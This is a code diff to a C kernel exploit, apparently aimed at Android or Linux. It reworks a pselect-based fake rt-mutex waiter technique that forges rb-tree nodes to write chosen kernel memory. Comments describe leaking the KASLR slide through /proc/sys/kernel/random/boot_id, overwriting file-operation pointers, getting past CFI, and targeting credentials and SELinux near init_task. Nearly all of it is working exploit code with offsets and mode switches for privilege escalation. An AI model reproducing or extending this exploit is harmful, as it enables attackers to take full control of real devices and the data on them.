@@ -997,6 +997,32 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                   (active_offsets && active_offsets->off_init_task)
                       ? (uint64_t)active_offsets->off_init_task
                       : (uint64_t)INIT_TASK_OFF;
+              uint64_t bss_off =
+                  (active_offsets && active_offsets->off_bss_tail_lock)
+                      ? (uint64_t)active_offsets->off_bss_tail_lock
+                      : 0x02BB9D00ULL;
+              if (env_flag("MODE4_NULL_STORE", 0)) {
+                /* LEAF-NULL (T1 tree_pc=0 is banned): red parent=TARGET-8,
+                 * left=right=0. change_child else → *TARGET=0 without
+                 * planting TARGET in lock->waiters (that is what KPd T1).
+                 * Same geometry as ZERO_NAME (ALIVE). Overlay lock is
+                 * init_task+0x878 so W2 cred can use bss_tail. */
+                (void)bss_off;
+                tree_pc = (ztgt - 8) & ~3ULL;
+                tree_r = 0;
+                tree_l = 0;
+                pi_parent = 0;
+                pi_right = 0;
+                pi_left = 0;
+                stack_task = data_addr(KIMAGE_TEXT_BASE + it_off);
+                stack_lock = data_addr(KIMAGE_TEXT_BASE + it_off + 0x878ULL);
+                stack_prio = 3;
+                stack_deadline = 0;
+                pr_info("stack mode4 LEAF-NULL *%016llx=0 parent=%016llx "
+                        "lock=init_task+0x878 (not tree_pc=0)\n",
+                        (unsigned long long)ztgt,
+                        (unsigned long long)tree_pc);
+              } else {
               uint64_t plain = (uint64_t)data_addr(KIMAGE_TEXT_BASE +
                                                    0x02BB0000ULL);
               tree_pc = plain & ~1ULL; /* red */
@@ -1012,6 +1038,7 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
               pr_info("stack mode4 SLIDE_ZERO PLAIN-STORE *state=%016llx "
                       "val=%016llx (enf=0 init≠0) lock=init_task+0x878\n",
                       (unsigned long long)ztgt, (unsigned long long)plain);
+              }
             }
           } else if (env_flag("MODE4_SLIDE_SWAP", 0)) {
             /*
@@ -1066,19 +1093,27 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
              * Then: cat /proc/sys/kernel/random/boot_id shows nfulnl_logger
              * bytes (kernel text ptrs) as a UUID -> KASLR slide!
              */
-            tree_pc = (uint64_t)data_addr(KIMAGE_TEXT_BASE + 0x27c14b8);
-            tree_r = 0;
-            tree_l = (uint64_t)data_addr(KIMAGE_TEXT_BASE + 0x28da8e0);
-            pi_parent = 0;
-            pi_right = 0;
-            pi_left = 0;
-            stack_lock = fake_lock;
-            stack_prio = 3;
-            stack_deadline = 0;
-            pr_info("stack mode4 SLIDE: *%016llx = %016llx "
-                    "(nfulnl_logger → boot_id ctl_table.data)\n",
-                    (unsigned long long)tree_l,
-                    (unsigned long long)tree_pc);
+            {
+              uint64_t it_off =
+                  (active_offsets && active_offsets->off_init_task)
+                      ? (uint64_t)active_offsets->off_init_task
+                      : (uint64_t)INIT_TASK_OFF;
+              tree_pc = (uint64_t)data_addr(KIMAGE_TEXT_BASE + 0x27c14b8);
+              tree_r = 0;
+              tree_l = (uint64_t)data_addr(KIMAGE_TEXT_BASE + 0x28da8e0);
+              pi_parent = 0;
+              pi_right = 0;
+              pi_left = 0;
+              /* Park overlay: O26–O28 KP'd with spray lock at pre-select. */
+              stack_task = data_addr(KIMAGE_TEXT_BASE + it_off);
+              stack_lock = data_addr(KIMAGE_TEXT_BASE + it_off + 0x878ULL);
+              stack_prio = 3;
+              stack_deadline = 0;
+              pr_info("stack mode4 SLIDE NOSPRAY: *%016llx = %016llx "
+                      "(nfulnl_logger → boot_id) lock=init_task+0x878\n",
+                      (unsigned long long)tree_l,
+                      (unsigned long long)tree_pc);
+            }
           } else if (use_classic) {
             /* only-right: parent=MISC-8 (black), right=fake_fops → *MISC=fake_fops */
             tree_pc = (misc - 8) & ~3ULL;
@@ -1293,11 +1328,20 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
           pi_parent = 0;
           pi_right = 0;
           pi_left = 0;
-          stack_lock = fake_lock;
-          stack_prio = 200;
-          stack_deadline = 0x1000;
+          /* ALIVE ZERO_NAME used compact prio=0 and BSS-class overlay,
+           * not spray lock + prio 200 (ZI 7239f288 KP at place). */
+          {
+            uint64_t it_off =
+                (active_offsets && active_offsets->off_init_task)
+                    ? (uint64_t)active_offsets->off_init_task
+                    : 0x027CC000ULL;
+            stack_lock = data_addr(KIMAGE_TEXT_BASE + it_off + 0x878ULL);
+          }
+          stack_prio = 0;
+          stack_deadline = 0;
           pr_info("stack mode4 ZERO_NAME parent=MISC-16=%016llx right=0 "
-                  "left=0 prio=200 (leaf → *name=0; chain_phase=%d)\n",
+                  "left=0 prio=0 lock=init_task+0x878 (leaf *name=0; "
+                  "chain_phase=%d)\n",
                   (unsigned long long)tree_pc, g_mode4_chain_phase);
         } else if (env_flag("MODE4_ZERO_OWNER", 0) ||
                    (env_flag("MODE4_ZIO", 0) && g_mode4_chain_phase == 2) ||
@@ -1593,7 +1637,7 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
            * child->__rb_parent_color = pc -> *TARGET = VALUE.
            * Default: VALUE=0 (write zero), TARGET=0 (no write). */
           {0, tree_pc, "tree_pc"},
-          {1, 0, "tree_right"},
+          {1, tree_r, "tree_right"},
           {2, tree_l, "tree_left"},
           {3, 0, "pi_parent"},
           {4, 0, "pi_right"},
@@ -1607,8 +1651,8 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
            "pi_left"},
           {6, stack_task, "task"},
           {7, stack_lock, "lock"},
-          {8, 0, "prio"},
-          {9, 0, "deadline"},
+          {8, stack_prio, "prio"},
+          {9, stack_deadline, "deadline"},
         };
         for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
           struct pselect_waiter_word *w = &words[i];
@@ -1735,12 +1779,11 @@ void do_pselect_fake_lock_route(void) {
     pr_info("MODE4_CHAIN=1: phase1 ZERO_NAME, phase2 ZERO_OWNER, "
             "phase3 ION_SAFE (same process; rb-leaf fops)\n");
   for (int route_attempt = 1; route_attempt <= max_att; route_attempt++) {
-    if (sc || vs || pad3 || zion || zi || wion || zio || chain)
+    if (sc || vs || pad3 || zion || zi || wion || zio || chain) {
       g_mode4_chain_phase = route_attempt;
-    if (sc || vs) /* distinct prio per phase so every walk really runs */
+      /* Each walk must change waiter prio or setattr no-ops. */
       consumer_nice = PSELECT_CONSUMER_NICE - (route_attempt - 1);
-    else
-      g_mode4_chain_phase = 0;
+    }
     if (route_attempt != 1) {
       int reuse_page =
           (sc || vs || chain || zion || zi || wion || zio || pad3) &&
@@ -1825,7 +1868,9 @@ void do_pselect_fake_lock_route(void) {
                        env_flag("MODE4_ION_SAFE", 0) ||
                        env_flag("MODE4_ION_FOPS", 0) ||
                        g_mode4_chain_phase == 3 ||
-                       (zion && g_mode4_chain_phase == 2);
+                       (env_flag("MODE4_ZION", 0) && g_mode4_chain_phase == 2) ||
+                       (env_flag("MODE4_ZI", 0) && g_mode4_chain_phase == 2) ||
+                       (env_flag("MODE4_WION", 0) && g_mode4_chain_phase == 2);
         if (!ion_lock && got_lock != (uint64_t)fake_lock)
           pr_warning("pselect LOCK MISPLACE got=%016llx want=%016zx "
                      "(overlay misaligned -> softboot risk)\n",
@@ -1949,25 +1994,13 @@ void do_pselect_fake_lock_route(void) {
                 route_attempt, ret, PSELECT_EXPECTED_READY);
       }
       if (env_flag("MODE4_SWAP_NOCFI", 0)) {
-        /* Bisect: swap landed, deliberately never open ashmem. */
-        pr_info("SWAP_NOCFI: skipping post-walk cfi probe\n");
+        /* Bisect: swap landed, deliberately never open ashmem here.
+         * Main may PLAIN-STORE NULL into fake_fops.llseek then open.
+         * Do not sleep in this worker — that pinned core 7 and blocked
+         * the in-process repair walk. Spray fds stay in the process. */
+        pr_info("SWAP_NOCFI: skipping post-walk cfi probe fake_fops=%016zx\n",
+                fake_fops);
         route_verified = 1;
-        if (env_flag("MODE4_SWAP_HOLD", 0)) {
-          /* N7: classify ALIVE then delayed SOFTBOOT after process exit
-           * freed the SKB page while *MISC.fops still pointed at it.
-           * Stay alive so spray fds/pages remain valid for swap_probe. */
-          pr_info("SWAP_HOLD: spray live fake_fops=%016zx pid=%d — not exiting\n",
-                  fake_fops, getpid());
-          live_sync_log("STAGE", "swap_hold");
-          durable_proof_log("swap_hold");
-          fflush(stdout);
-          fsync(STDOUT_FILENO);
-          /* Let main continue (SLIDE_ZERO selinux). Do NOT open ashmem —
-           * N11/N12 died in open() through the swapped table. */
-          atomic_store(&route_done, 1);
-          for (;;)
-            sleep(30);
-        }
       } else if (pselect_custom_write_enabled()) {
         cfi_last_step = 0;
         cfi_last_errno = 0;
